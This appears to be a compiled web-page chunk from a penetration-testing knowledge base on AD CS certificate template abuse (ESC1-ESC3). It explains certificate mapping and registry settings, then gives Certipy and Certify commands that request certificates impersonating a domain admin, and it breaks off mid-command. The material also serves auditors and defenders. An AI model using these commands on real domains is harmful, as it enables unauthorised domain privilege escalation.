import{_ as o,c as k,a5 as n,G as t,w as a,j as i,a as e,B as r,o as d}from"./chunks/framework.B5CpDqM0.js";const c="/assets/ad-cs_cert_templates_vuln_confs.Dx00SfnC.png",p="/assets/explicit_mapping.CfHEWvSQ.webp",g="/assets/CT_FLAG.Df9ZBgv6.webp",v=JSON.parse('{"title":"Certificate templates","description":"","frontmatter":{"authors":"BlWasp, ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/adcs/certificate-templates.md","filePath":"ad/movement/adcs/certificate-templates.md","lastUpdated":1724982529000}'),u={name:"ad/movement/adcs/certificate-templates.md"},E={class:"warning custom-block"};function F(y,s,m,C,f,b){const l=r("PluginTabsTab"),h=r("PluginTabs");return d(),k("div",null,[s[23]||(s[23]=n('<h1 id="certificate-templates" tabindex="-1">Certificate templates <a class="header-anchor" href="#certificate-templates" aria-label="Permalink to &quot;Certificate templates&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><h3 id="template-theory" tabindex="-1">Template theory <a class="header-anchor" href="#template-theory" aria-label="Permalink to &quot;Template theory&quot;">​</a></h3><blockquote><p>AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. These templates are collections of enrollment policies and predefined certificate settings and contain things like “<em>How long is this certificate valid for?</em>”, <em>“What is the certificate used for?”,</em> “<em>How is the subject specified?</em>”, <em>“Who is allowed to request a certificate?”</em>, and a myriad of other settings</p><p>[...]</p><p>There is a specific set of settings for certificate templates that makes them extremely vulnerable. As in regular-domain-user-to-domain-admin vulnerable.</p><p>(<a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">specterops.io</a>)</p></blockquote><p>In <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">their research papers</a>, <a href="https://twitter.com/harmj0y" target="_blank" rel="noreferrer">Will Schroeder</a> and <a href="https://twitter.com/tifkin_" target="_blank" rel="noreferrer">Lee Christensen</a> found multiple vectors of domain escalation based on certificate template misconfigurations (dubbed <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#180f" target="_blank" rel="noreferrer">ESC1</a>, <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#dfa4" target="_blank" rel="noreferrer">ESC2</a> and <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#c08e" target="_blank" rel="noreferrer">ESC3</a>).</p><p>Following this, <a href="https://twitter.com/ly4k_" target="_blank" rel="noreferrer">Olivier Lyak</a> has found two new template misconfigurations (dubbed <a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" target="_blank" rel="noreferrer">ESC9</a> and <a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" target="_blank" rel="noreferrer">ESC10</a>).</p><p><img src="'+c+'" alt="Vulnerable configurations for ESC1, ESC2 and ESC3"></p><h3 id="certificate-mapping" tabindex="-1">Certificate mapping <a class="header-anchor" href="#certificate-mapping" aria-label="Permalink to &quot;Certificate mapping&quot;">​</a></h3><p>This section focuses on how a certificate is associated with an account object. Certificate mapping is the part of certificate authentication where the DC takes the principal (user or computer) data provided in the certificate used during authentication, and attempts to map it to a user or computer in the domain.</p><p>Understanding certificate mapping is essential to understand <a href="./certificate-templates#no-security-extension-esc9">ESC9</a>, <a href="./certificate-templates#weak-certificate-mapping-esc10">ESC10</a> and <a href="./certificate-templates#weak-explicit-mapping-esc14">ESC14</a>.</p><p>Mapping can be implicit or explicit, and strong or weak. These two notions work together, and the mapping of a certificate will use one option of each part (implicit and strong, or explicit and strong, and so on).</p><h4 id="implicit-certificate-mapping" tabindex="-1">Implicit certificate mapping <a class="header-anchor" href="#implicit-certificate-mapping" aria-label="Permalink to &quot;Implicit certificate mapping&quot;">​</a></h4><p>With implicit mapping, the information contained in the certificate&#39;s SAN (<em>Subject Alternative Name</em>) is used to match the UPN attribute (<code>userPrincipalName</code>) for a user or the DNS attribute (<code>dNSHostName</code>) for a machine account. In the case of a user account, the <code>otherName</code> component of the SAN is used, and for a machine account it is <code>dNSName</code>.</p><p>If the UPN mapping fails, the DC will attempt to match the username contained in <code>otherName</code> with the <code>sAMAccountName</code> attribute, and then with <code>sAMAccountName</code> suffixed with a <code>$</code>. Similarly, if DNS mapping fails, the DC will attempt to match the hostname contained in <code>dNSName</code> suffixed with a <code>$</code> with the <code>sAMAccountName</code>.</p><h4 id="explicit-certificate-mapping" tabindex="-1">Explicit certificate mapping <a class="header-anchor" href="#explicit-certificate-mapping" aria-label="Permalink to &quot;Explicit certificate mapping&quot;">​</a></h4><p>For an explicit match, the <code>altSecurityIdentities</code> attribute of an account (user or machine) must contain the identifiers of the certificates with which it is authorised to authenticate. The certificate must be signed by a trusted certification authority and match one of the values in the <code>altSecurityIdentities</code> attribute.</p><p>The matches that can be added to the attribute are strings that follow a syntax defined with the identifiers of a certificate:</p><p><img src="'+p+'" alt="explicit_mapping.webp"></p><p>These identifiers can be found in the various fields of an X509 v3 certificate.</p><p>In AD CS, the certificate template specifies how the CA should populate the <code>Subject</code> field and the SAN extension of the certificate based on the enrollee&#39;s AD attributes.</p><h4 id="certificate-attributes" tabindex="-1">Certificate attributes <a class="header-anchor" href="#certificate-attributes" aria-label="Permalink to &quot;Certificate attributes&quot;">​</a></h4><p>Before explaining weak and strong labels, it is important to talk about certificate attributs. The options in the &quot;Subject Name&quot; tab of the Windows Certificate Template Console correspond to the flags in the <code>msPKI-Certificate-Name-Flag</code> attribute of the certificate template. Flags whose names follow the pattern <code>CT_FLAG_SUBJECT_REQUIRE_&lt;attribute&gt;</code> relate to the information contained in the <code>Subject</code> field of the certificate, and <code>CT_FLAG_SUBJECT_ALT_REQUIRE_&lt;attribute&gt;</code> relates to the SAN extension.</p><p>When a certificate template requires an attribute from the enrolled account, but the enrolled account does not have that attribute or it is not defined, the behaviour may differ. Most flags are strong requirements (i.e. enrolment fails if the attribute is not defined for the enrolled account), but there are exceptions, as shown in the table below:</p><p><img src="'+g+'" alt="CT_FLAG.webp"></p><p>Some flags prevent default users/computers from enrolling in a given certificate scheme, because the required attributes are not set by default:</p><ul><li><code>mail</code>: the mail attribute for users and computers is not set by default</li><li><code>dNSHostName</code>: users do not have a <code>dNSHostName</code> attribute, so users cannot enroll in certificate templates requiring <code>dNSHostName</code>; computers will have their <code>dNSHostName</code> attribute set when the computer is attached to a domain, but the attribute will not be set automatically simply by creating a computer object in the AD</li><li><code>userPrincipalName</code>: the UPN attribute is not set by default for computers, but it is for users</li><li><code>cn</code> : all AD objects have a <code>cn</code> attribute set by default</li></ul><h4 id="weak-and-strong-mapping" tabindex="-1">Weak and strong mapping <a class="header-anchor" href="#weak-and-strong-mapping" aria-label="Permalink to &quot;Weak and strong mapping&quot;">​</a></h4><p>As explained before, <em>weak</em> and <em>strong</em> &quot;labels&quot; are applied to certificate mapping and will influence on the final behavior of explicit and implicit mappings during Kebreros and Schannel authentications.</p><p>Following <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" target="_blank" rel="noreferrer">CVE-2022–26923</a> (<a href="./certifried">certifried.md</a>) discovered by <a href="https://twitter.com/ly4k_" target="_blank" rel="noreferrer">Olivier Lyak</a>, Microsoft has implemented a new security extension for the issued certificates, and two new registry keys to properly deal with certificate mapping.</p><ul><li>The <code>szOID_NTDS_CA_SECURITY_EXT</code> extension contains the <code>objectSid</code> of the requester and is used during implicit strong mapping</li><li>The <code>StrongCertificateBindingEnforcement</code> registry key is used for Kerberos mapping</li><li>The <code>CertificateMappingMethods</code> registry key is used for Schannel implicit mapping</li></ul><p>Kerberos authentication</p><p>In the case of Kerberos authentication, the introduction of <em>strong</em> mapping for implicit matching means that the object&#39;s SID can be used (via the <code>szOID_NTDS_CA_SECURITY_EXT</code> certificate extension) rather than the UPN and DNS, which can be easily spoofed.</p><p>In the case of explicit mapping, the update has implemented <em>weak</em> and <em>strong</em> &quot;labels&quot; on the mapping types (see table in the Explicit certificate mapping section above). The use of strong mapping implies the use of the corresponding mapping types.</p><p>During Kerberos authentication, the certificate mapping process will call the <code>StrongCertificateBindingEnforcement</code> registry key. This key can be equal to three values:</p><ul><li><code>0</code>: no strong certificate mapping is realised. The new <code>szOID_NTDS_CA_SECURITY_EXT</code> extension is not check, all explicit mappings are allowed (see comments below) and the authentication behaviour is similar to what was done before the patch. This mode is no longer effective since 11/04/2023, and indicating the value <code>0</code> in the key is now equivalent to indicating <code>1</code></li><li><code>1</code>: default value after the patch. If explicit mapping is present, authentication is allowed. Otherwise, in the implicit case, weak mapping is authorised if the certificate does not contain an SID in the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension and the account predates the certificate. This mode will end on 11/02/2025</li><li><code>2</code>: only strong mapping is allowed. In implicit the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension must be present and contain the object&#39;s SID, in explicit only strong types are authorised. In all other cases, authentication is refused.</li></ul><p>If the registry key value is <code>0</code> and the certificate contains an UPN value (normally for a user account), as seen previously, the KDC will first try to associate the certificate with a user whose <code>userPrincipalName</code> attribute matches. If no validation can be performed, the KDC looks for an account whose <code>sAMAccountName</code> property matches. If it doesn&#39;t find one, it tries again by adding a <code>$</code> to the end of the user name. That way, a certificate with a UPN can be associated with a machine account.</p><p>If the registry key value is <code>0</code> and the certificate contains an DNS value (normally for a machine account), the KDC splits the user and the domain part, i.e. <code>user.domain.local</code> becomes <code>user</code> and <code>domain.local</code>. The domain part is validated against the Active Directory domain, and the user part is validated adding a <code>$</code> at the end, and searching for an account with a corresponding <code>sAMAccountName</code>.</p><p>If the registry key value is <code>1</code> or <code>2</code>, and no explicit mapping is in place, the <code>szOID_NTDS_CA_SECURITY_EXT</code> security extension will be used to implicitly map the account using its <code>objectSid</code>. If the registry key is set to <code>1</code> and no security extension is present, the mapping behaviour is similar to that of a registry key set to <code>0</code>.</p><p>To support compatibility mode, Microsoft has introduced the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag for the <code>msPKI-Enrollment-Flag</code> attribute of certificate templates. If present, the CA will not include the user&#39;s SID when issuing certificates (see <a href="./certificate-templates#no-security-extension-esc9">ESC9</a>).</p><p>As indicated by Jonas Bülow Knudsen <a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9" target="_blank" rel="noreferrer">in his article</a>, observations can be done regarding Kerberos authentication:</p><ul><li>UPN mapping blocks explicit mapping: if the certificate has the <code>otherName</code> component in the SAN extension, the KDC will attempt an implicit UPN match and authentication will fail if it fails; the KDC will not attempt an explicit match in this case, but will do so in all other cases</li><li>DNS mapping does not block explicit mapping: you can use a certificate with <code>dNSName</code> in the SAN for implicit DNS mapping, but explicit mapping against users and computers works too</li><li>the <code>X509RFC822</code> (email) mapping does not work for computers: adding an <code>X509RFC822</code> mapping to a computer has no effect; the KDC does not allow authentication using a certificate whose corresponding email is defined in the <code>rfc822Name</code> component under the SAN extension. However, it is possible to enrol on a certificate as a computer with the mail attribute and use it to authenticate as a user using the <code>X509RFC822</code> mapping</li><li>the <code>X509SubjectOnly</code> and <code>X509IssuerSubject</code> mappings are blocked by the mail in the <code>Subject</code> field: if the certificate template has the <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code> attribute, so that the certification authority adds the value of the mail attribute to the <code>Subject</code> field of the certificate, it is not possible to perform the explicit <code>X509SubjectOnly</code> and <code>X509IssuerSubject</code> mappings</li><li>the full DN cannot be used in the <code>X509SubjectOnly</code> and <code>X509IssuerSubject</code> mappings: the <code>distinguishedName</code> cannot be used in the <code>X509SubjectOnly</code> and <code>X509IssuerSubject</code> mappings, so the certificate template cannot have the <code>SUBJECT_REQUIRE_DIRECTORY_PATH</code> flag for these mappings</li></ul><p>It is worth noting that registry parameters only apply on the host on which they are configured. This means that domain controllers is the same Active Directory domain (or forest) can have different configurations for <code>UseSubjectAltName</code> and <code>StrongCertificateBindingEnforcement</code>, some of which allow weak certificates to be mapped, while others do not.</p><p>Schannel authentication</p><p>During Kerberos authentication, the certificate mapping process will call the <code>CertificateMappingMethods</code> registry key. This key can be a combinaison of the following values:</p><ul><li><code>0x0001</code>: subject/issuer explicit mapping</li><li><code>0x0002</code>: issuer explicit mapping</li><li><code>0x0004</code>: SAN implicit mapping</li><li><code>0x0008</code>: S4USelf implicit Kerberos mapping</li><li><code>0x0010</code>: S4USelf explicit Kerberos mapping</li></ul><p>The current default value is <code>0x18</code> (<code>0x8</code> and <code>0x10</code>). Schannel doesn&#39;t support the new <code>szOID_NTDS_CA_SECURITY_EXT</code> security extension directly, but it can use it by &quot;converting&quot; the Schannel certificate mapping to a Kerberos certificate mapping using S4USelf. Then, the mapping will be performed as presented in the Kerberos authentication section.</p><p>If some certificate authentication issues are encountered in an Active Directory, <a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16" target="_blank" rel="noreferrer">Microsoft has officially suggested</a> to set the <code>CertificateMappingMethods</code> value to <code>0x1f</code> (old value).</p><h4 id="issuance-policies" tabindex="-1">Issuance policies <a class="header-anchor" href="#issuance-policies" aria-label="Permalink to &quot;Issuance policies&quot;">​</a></h4><p>It is possible to apply issuance policies to certificate templates. This takes the form of a certificate extension, and is stored as an OID (object identifier) in the <code>msPKI-Certificate-Policy</code> attribute of the template. When the CA issues the certificate, the policy is added to the &quot;Certificate Policies&quot; attribute of the certificate. A template stores required policies in the <code>msPKI-RA-Policies</code> attribute.</p><p>An issuance policy can be set up by a company, for example, for access control: a system can require a user to present a certificate with a given policy in order to guarantee that the system only grants access to authorised users. Issuing policies are <code>msPKI-Enterprise-Oid</code> objects found in the PKI OID container (<code>CN=OID,CN=Public Key Services,CN=Services</code>, in the Configuration Naming Context).</p><p>This object has an <code>msDS-OIDToGroupLink</code> attribute which allows a policy to be linked to an AD group so that a system can authorise a user presenting the certificate as if he were a member of this group. As explained by <a href="https://twitter.com/Jonas_B_K" target="_blank" rel="noreferrer">Jonas Bülow Knudsen</a> in <a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" target="_blank" rel="noreferrer">his ADCS ESC13 article</a>.</p><blockquote><p>If you perform client authentication with the certificate, then you will receive an access token specifying the membership of this group.</p><p>(<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" target="_blank" rel="noreferrer">specterops.io</a>)</p></blockquote><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="esc1-template-allows-san" tabindex="-1">(ESC1) Template allows SAN <a class="header-anchor" href="#esc1-template-allows-san" aria-label="Permalink to &quot;(ESC1) Template allows SAN&quot;">​</a></h3><p>When a certificate template allows to specify a <code>subjectAltName</code>, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies <code>Client Authentication</code> or <code>ANY</code>.</p>',55)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[0]||(s[0]=[i("p",null,[e("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios.")],-1),i("p",null,[e("Once a vulnerable template is found ("),i("a",{href:"./#attack-paths"},"how to enumerate"),e("), a request shall be made to obtain a certificate.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#To specify a user account in the SAN")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'vulnerable template'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain admin'")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#To specify a computer account in the SAN")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'vulnerable template'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dns"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'dc.domain.local'")])])])],-1),i("div",{class:"warning custom-block"},[i("p",null,[e("The "),i("code",null,"$ADCS_HOST"),e(" target must be a FQDN (not an IP).")])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate.")],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),e(" flag can be used to set whether to use LDAP or LDAPS.")])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[1]||(s[1]=[i("p",null,[e("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) tool can be used.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using default low-privileged group")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"vulnerable")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"vulnerable "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"currentuser")])])])],-1),i("p",null,[e("Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as SAN ("),i("code",null,"subjectAltName"),e(").")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Vulnerable template"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altname:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"admin"')])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate.")],-1)])),_:1})]),_:1}),s[24]||(s[24]=i("h3",{id:"esc2-any-purpose-eku",tabindex:"-1"},[e("(ESC2) Any purpose EKU "),i("a",{class:"header-anchor",href:"#esc2-any-purpose-eku","aria-label":'Permalink to "(ESC2) Any purpose EKU"'},"​")],-1)),s[25]||(s[25]=i("p",null,"When a certificate template specifies the Any Purpose EKU, or no EKU at all, the certificate can be used for anything. ESC2 can't be abused like ESC1 if the requester can't specify a SAN, however, it can be abused like ESC3 to use the certificate as requirement to request another one on behalf of any user.",-1)),s[26]||(s[26]=i("h3",{id:"esc3-certificate-agent-eku",tabindex:"-1"},[e("(ESC3) Certificate Agent EKU "),i("a",{class:"header-anchor",href:"#esc3-certificate-agent-eku","aria-label":'Permalink to "(ESC3) Certificate Agent EKU"'},"​")],-1)),s[27]||(s[27]=i("p",null,"When a certificate template specifies the Certificate Request Agent EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.",-1)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[2]||(s[2]=[i("p",null,[e("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," find"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -vulnerable")])])])],-1),i("p",null,[e("Once a vulnerable template is found ("),i("a",{href:"./#attack-paths"},"how to enumerate"),e("), a request shall be made to obtain a certificate specifying the Certificate Request Agent EKU.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' 